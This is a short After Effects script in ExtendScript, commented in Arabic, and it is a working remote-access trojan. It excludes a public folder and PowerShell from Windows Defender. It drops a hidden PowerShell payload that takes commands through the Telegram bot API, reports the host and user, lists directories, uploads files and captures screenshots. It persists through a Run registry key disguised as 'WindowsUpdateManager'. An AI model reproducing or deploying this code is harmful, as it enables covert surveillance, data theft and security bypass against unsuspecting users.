(function() {
    try {
        var token = "";
        var chatid = ""; 

        var publicPath = "C:\\Users\\Public\\";
        var psScript = publicPath + "sys_core.ps1";
        var vbsScript = publicPath + "sys_run.vbs";

        // 1. محاولة تجاوز الحماية (أمر مباشر وبسيط)
        // سيظهر طلب صلاحيات مسؤول، يجب الموافقة عليه
        var bypass = 'powershell.exe -Command "Start-Process powershell -ArgumentList \'-Command Add-MpPreference -ExclusionPath ' + publicPath + ' -ExclusionProcess powershell.exe\' -Verb RunAs"';
        system.callSystem(bypass);

        $.sleep(3000); // إعطاء النظام وقت للمعالجة

        // 2. إنشاء ملف PowerShell
        var f1 = new File(psScript);
        f1.open("w");
        // التغيير هنا: التأكد من أن الكود سليم 100% وبدون أخطاء نصية
        var psPayload = '$t="' + token + '";$c="' + chatid + '";' +
'try { Invoke-RestMethod "https://api.telegram.org/bot$t/sendMessage?chat_id=$c&text=%E2%9C%85 Target Online%0A%F0%9F%92%BB Device : $env:COMPUTERNAME%0A%F0%9F%91%A4 User : $env:USERNAME" } catch {};' +
'while($true){ try{ $r=Invoke-RestMethod "https://api.telegram.org/bot$t/getUpdates?offset=$($u+1)"; foreach($up in $r.result){ $u=$up.update_id; $m=$up.message.text; ' +
'if($m -match "^\\u0645\\u0633\\u0627\\u0631\\s+(.*)"){ $p=$matches[1]; try{ $items=Get-ChildItem -Path $p -ErrorAction SilentlyContinue | Select-Object -First 50 @{Name="Type";Expression={if($_.PSIsContainer){"%F0%9F%93%81[FLD]"}else{"%F0%9F%8C%80[FiLe]"}}}, Name | Out-String; $f=if($items.Length -gt 4000){$items.Substring(0,3900)+"%0A... [Truncated]"}else{$items}; Invoke-RestMethod "https://api.telegram.org/bot$t/sendMessage?chat_id=$c&text=DIR: $p%0A$f" }catch{ Invoke-RestMethod "https://api.telegram.org/bot$t/sendMessage?chat_id=$c&text=Error accessing path" } } ' +
'elseif($m -match "^\\u0647\\u0627\\u062a\\s+(.*)"){ $fp=$matches[1]; curl.exe -s -X POST "https://api.telegram.org/bot$t/sendDocument" -F "chat_id=$c" -F "document=@$fp" } ' +
'elseif($m -eq "\\u0635\\u0648\\u0631\\u0629"){ $p="'+publicPath+'s.png"; Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.SendKeys]::SendWait("{PRTSC}"); Start-Sleep -m 500; $i=[System.Windows.Forms.Clipboard]::GetImage(); if($i){$i.Save($p,[System.Drawing.Imaging.ImageFormat]::Png); curl.exe -s -X POST "https://api.telegram.org/bot$t/sendPhoto" -F "chat_id=$c" -F "photo=@$p"; Remove-Item $p} }' +
            '}}catch{}; Start-Sleep 5 }';
        f1.write(psPayload);
        f1.close();

        // 3. إنشاء ملف VBS
        var f2 = new File(vbsScript);
        f2.open("w");
        f2.write('CreateObject("WScript.Shell").Run "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File ' + psScript + '", 0, False');
        f2.close();

// 4. التثبيت الدائم (تعديل لضمان عدم حدوث خطأ)
        // بنمسح أي قيم قديمة غلط وبنضيف القيمة الصح
        system.callSystem('reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "win_sync" /f'); // حذف الخطأ القديم
        var regCmd = 'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "WindowsUpdateManager" /t REG_SZ /d "wscript.exe ' + vbsScript + '" /f';
        system.callSystem(regCmd);

        // 4. التشغيل المباشر عبر CMD لتجنب قيود AE أحياناً
        system.callSystem('cmd.exe /c wscript.exe ' + vbsScript);

    } catch(e) {
        alert("Error: " + e.message); // فعلنا التنبيه هنا فقط لنعرف أين المشكلة
    }
})();










